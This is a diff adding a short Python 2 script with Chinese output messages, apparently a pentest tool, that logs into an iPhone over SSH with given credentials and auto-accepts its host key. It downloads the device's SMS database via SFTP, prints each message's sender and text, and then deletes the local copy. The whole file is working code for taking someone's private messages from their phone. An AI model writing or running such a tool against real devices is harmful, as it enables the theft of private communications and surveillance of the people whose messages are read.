@@ -1,0 +1,66 @@
+#!/usr/bin/env python
+#coding=utf8
+import socket
+import sys
+import os
+import paramiko
+from pysqlite2 import dbapi2 as sqlite
+import sqlite3
+ 
+ip = ''
+port = 22
+username = ''
+password = ''
+sms_remote = '/private/var/mobile/Library/SMS/sms.db'
+local_file = '/tmp/'
+ 
+def start():
+        print "iphone短信读取程序"
+ 
+#Function which dl the sms db on the iphone
+def dlsms():
+        if (len(sys.argv) == 4):
+                ip = sys.argv[1]
+                username = sys.argv[2]
+                password = sys.argv[3]
+        else:
+                print "Usage : ./"+sys.argv[0] 
+                print "Exemple : ./"+sys.argv[0]+" ip username password"
+                sys.exit(0);
+ 
+        print u"读取短信目标IP:", ip, "..."
+        t = paramiko.SSHClient()
+        t.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        t.load_system_host_keys()
+        t.connect(ip, port=port, username=username, password=password)
+        ftp = t.open_sftp()
+        try:
+                sms_file_ok = local_file + ip + '.sms.db'
+                ftp.get(sms_remote, sms_file_ok)
+                print u"正在下载 ..."
+        except:
+                print u"未发现短信 :(  ..."
+ 
+        return sms_file_ok
+ 
+def readsms(smslocal):
+        #local_file = '/home/pentest/Desktop/iphonesms/test.db'
+        conn = sqlite3.connect(smslocal)
+        c = conn.cursor()
+        for row in c.execute("select * from message"):
+                print u"来自:"
+                print row[1]
+                print u"内容:"
+                print row[3].encode('utf8')
+                print "\n"
+ 
+ 
+def main():
+        start()
+        smslocal = dlsms()
+        readsms(smslocal)
+        os.remove(smslocal) #注释掉此句不会删除下载的短信数据库
+        return 0
+ 
+if __name__ == '__main__':
+        main()
